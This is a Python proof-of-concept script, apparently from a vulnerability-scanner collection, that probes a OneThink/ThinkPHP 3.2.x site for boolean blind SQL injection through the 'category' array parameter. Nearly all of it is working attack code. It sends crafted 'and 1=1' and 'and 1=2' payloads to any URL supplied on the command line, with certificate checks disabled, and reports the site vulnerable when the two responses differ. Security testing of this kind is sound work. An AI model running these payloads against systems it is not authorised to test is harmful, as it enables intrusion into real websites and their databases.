#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Onethink 参数category SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0176868
author: Lucifer
description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/Home/Controller/ArticleController.class.php中,category数组存在bool型盲注入,
    影响版本ThinkPHP 3.2.0和3.2.3
'''
import sys
import requests
import warnings
def run(url):
        result = ['Onethink 参数category SQL注入','','']
        reqlst = []
        payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
        for payload in payload1:
            vulnurl = url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                reqlst.append(str(req.text))
            except:
                result[2]='不存在'
                return result
        if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
            result[2]=  '存在'
            result[1] = vulnurl
            return result

        reqlst = []
        payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
        for payload in payload2:
            vulnurl = url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                reqlst.append(str(req.text))

            except:
                result[2]='不存在'
                return result
        if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
            result[2]=  '存在'
            result[1] = vulnurl
            return result
        else:
            result[2]=  '不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    